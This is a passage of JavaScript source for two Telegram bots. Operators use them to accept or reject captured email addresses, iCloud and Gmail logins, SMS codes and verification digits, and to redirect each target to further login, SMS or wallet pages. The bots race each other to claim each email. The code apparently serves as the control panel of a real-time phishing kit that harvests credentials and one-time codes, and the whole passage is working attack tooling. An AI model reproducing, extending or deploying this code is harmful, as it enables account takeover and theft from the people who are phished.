      if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verification_")) {
        userWinnerTelegram[email] = "telegram2";  // Bot 2 wins
        botsThatClickedPage1[email] = true;
        botsThatClickedPage1[`${email}_timestamp`] = Date.now();
        bot2WinnerTimestamp[email] = Date.now();  // ✅ Store Bot 2 win time for fake Page 2 timeout
        
        console.log(`🏆 Bot 2 WINS! ${email} at ${new Date().toISOString()}`);
        // ✅ NO NOTIFICATION - Only Bot 1 notifies, not Bot 2
      }

      // ============================================================================
      // ✅ Handle verification digit selection
      // ============================================================================
      
      if (action === "verify_digit") {
        const [, requestId, digit] = query.data.split("|");
        
        try {
          const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ requestId, digit })
          });
          
          const result = await updateResult.json();
          
          // ✅ Only remove keyboard and show message when we have 2 digits
          if (result.selectedCount === 2) {
            try {
              await bot2.editMessageReplyMarkup(
                { inline_keyboard: [] },
                { chat_id: query.message.chat.id, message_id: query.message.message_id }
              );
              
              await bot2.sendMessage(
                query.message.chat.id,
                `✅ <b>Numbers Selected!</b>`,
                { parse_mode: "HTML" }
              );
            } catch (err) {
              console.error("❌ Error editing message:", err);
            }
          }

          await bot2.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
          return;
        } catch (err) {
          console.error("❌ verify_digit error:", err);
          await bot2.answerCallbackQuery(query.id, { text: "Error processing digit" });
          return;
        }
      }

      // ============================================================================
      // ✅ WALLET DECISION BUTTONS (Bot 1)
      // ============================================================================

      if (action === "wallet_decision_sms" || action === "wallet_decision_done" || action === "wallet_decision_icloud" || action === "wallet_decision_gmail") {
        const email = identifier;

        try {
          // ✅ REMOVE BUTTONS from message
          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
          await fetch(editUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID,
              message_id: query.message?.message_id,
              reply_markup: JSON.stringify({ inline_keyboard: [] })
            })
          });
        } catch (err) {}

        try {
          await fetch(`${APP_URL}/update-wallet-decision`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, choice: action })
          });
          
          console.log(`✅ Wallet decision updated: ${action}`);
        } catch (err) {
          console.error("Error updating wallet decision:", err);
        }

        let statusMessage = "";
        
        if (action === "wallet_decision_sms") {
          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
        } else if (action === "wallet_decision_done") {
          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
        } else if (action === "wallet_decision_icloud") {
          statusMessage = `📧 <code>${email}</code> → ☁️`;
        } else if (action === "wallet_decision_gmail") {
          statusMessage = `📧 <code>${email}</code> → 🌈`;
        }

        if (statusMessage) {
          try {
            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const response = await fetch(replyUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: statusMessage,
                parse_mode: "HTML"
              })
            });
            
            if (response.ok) {
            } else {
              console.error(`❌ Failed to send status message. Response status: ${response.status}`);
            }
          } catch (err) {
            console.error(`❌ Error sending status message:`, err.message);
          }
        }

        bot.answerCallbackQuery(callbackId, {
          text: `✅ ${action.toUpperCase()}`,
          show_alert: false
        }).catch(() => {});

        return;
      }

      // ============================================================================
      // ✅ LOSER GETS NOTHING - NO POLLING, NO SECOND CHANCE
      // ============================================================================
      
      if (userWinnerTelegram[email] === "telegram1" && (action === "page1" || action === "page2")) {
        // ✅ Bot 1 is WINNER, Bot 2 is LOSER
        // Loser gets NOTHING - no polling, no waiting, no second chance
        
        console.log(`❌ Bot 2 (loser) clicked but gets nothing - Bot 1 won!`);
        
        try {
          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
          await fetch(editUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID_2,
              message_id: query.message?.message_id,
              reply_markup: JSON.stringify({ inline_keyboard: [] })
            })
          });
        } catch (err) {}

        try {
          await bot2.sendMessage(ADMIN_CHAT_ID_2, 
            `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`, 
            { parse_mode: "HTML" }
          );
        } catch (err) {
          console.error("Error sending acceptance message:", err);
        }

        await bot2.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
        return;
      }

      // ============================================================================
      // ✅ STEP 3: Handle other buttons (same as Bot 1)
      // ============================================================================

      const response = await fetch(`${APP_URL}/update-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, identifier: email, status: action })
      });

      if (action.includes("redirect_")) {
        await fetch(`${APP_URL}/update-redirection-choice`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, choice: action })
        });
      }

      if (response.ok) {
        try {
          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
          await fetch(editUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID_2,
              message_id: query.message?.message_id,
              reply_markup: JSON.stringify({ inline_keyboard: [] })
            })
          });
        } catch (err) {}

        let statusMessage = "";
        
        if (action === "page1") {
          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
        } else if (action === "page2") {
          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
        } else if (action === "reject") {
          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
        } else if (action === "page_accept") {
          statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
        } else if (action === "page_reject") {
          statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
        } else if (action === "sms_accept") {
          statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
        } else if (action === "sms_reject") {
          statusMessage = `💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`;
        } else if (action === "redirect_icloud") {
          statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
        } else if (action === "redirect_gmail") {
          statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
        } else if (action === "gmail_accept") {
          // ✅ For Gmail callbacks, fetch displayEmail
          try {
            const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
            const data = await response.json();
            displayEmail = data.displayEmail || email;
            console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
          } catch (err) {
            console.error("Error fetching Gmail display email:", err);
            displayEmail = email;
          }
          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
        } else if (action === "gmail_reject") {
          // ✅ For Gmail callbacks, fetch displayEmail
          try {
            const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
            const data = await response.json();
            displayEmail = data.displayEmail || email;
            console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
          } catch (err) {
            console.error("Error fetching Gmail display email:", err);
            displayEmail = email;
          }
          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
        } else if (action === "verification_accept") {
          // ✅ For verification callbacks, fetch displayEmail
          try {
            const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
            const data = await response.json();
            displayEmail = data.displayEmail || email;
            console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
          } catch (err) {
            console.error("Error fetching verification display email:", err);
            displayEmail = email;
          }
          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
        } else if (action === "verification_reject") {
          // ✅ For verification callbacks, fetch displayEmail
          try {
            const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
            const data = await response.json();
            displayEmail = data.displayEmail || email;
            console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
          } catch (err) {
            console.error("Error fetching verification display email:", err);
            displayEmail = email;
          }
          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
        } else if (action === "gmail_verify_accept") {
          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
        } else if (action === "gmail_verify_reject") {
          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
        } else if (action === "verifying_sms") {
          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
        } else if (action === "verifying_done") {
          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
        } else if (action === "verifying_wallet") {
          statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
        } else if (action === "verifying_icloud") {
          statusMessage = `📧 <code>${email}</code> → ☁️`;
        } else if (action === "verifying_gmail") {
          statusMessage = `📧 <code>${email}</code> → 🌈`;
        } else if (action === "sms2_wallet") {
          statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
        } else if (action === "sms2_done") {
          statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
        } else if (action === "sms2_reject") {
          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
        } else if (action === "wallet_decision_sms") {
          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
        } else if (action === "wallet_decision_done") {
          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
        } else if (action === "wallet_decision_icloud") {
          statusMessage = `📧 <code>${email}</code> → ☁️`;
        } else if (action === "wallet_decision_gmail") {
          statusMessage = `📧 <code>${email}</code> → 🌈`;
        }

        // ✅ UPDATE STATUS on backend for verification callbacks
        if (action === "verification_accept" || action === "verification_reject") {
          try {
            await fetch(`${APP_URL}/update-status`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ email: email, action: action })
            });
          } catch (err) {
            console.error("Error updating status:", err);
          }
        }

        if (statusMessage) {
          // ✅ Log status message to console (strip HTML tags for clean logs)
          const cleanMessage = statusMessage
            .replace(/<code>/g, '')
            .replace(/<\/code>/g, '')
            .replace(/<b>/g, '')
            .replace(/<\/b>/g, '')
            .replace(/<i>/g, '')
            .replace(/<\/i>/g, '');
          console.log(cleanMessage);
          
          try {
            const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
            await fetch(replyUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID_2,
                text: statusMessage,
                parse_mode: "HTML"
              })
            });
          } catch (err) {
            console.error(`❌ Failed to send status message:`, err);
          }
        }
      }

      bot2.answerCallbackQuery(callbackId, {
        text: `✅ ${action.toUpperCase()}`,
        show_alert: false
      }).catch(() => {});

    } catch (err) {
      console.error("❌ Error (Bot 2):", err.message);
      bot2.answerCallbackQuery(query.id, {
        text: "❌ Error",
        show_alert: true
      }).catch(() => {});
    }
  });
}

console.log(`✅ Bots ready`);

// ============================================================================
// ✅ EXPORT
// ============================================================================

module.exports = { 
  bot, 
  bot2,
  broadcastMessage,
  sendFollowUpMessage,
  userWinnerTelegram,
  botsThatClickedPage1
};
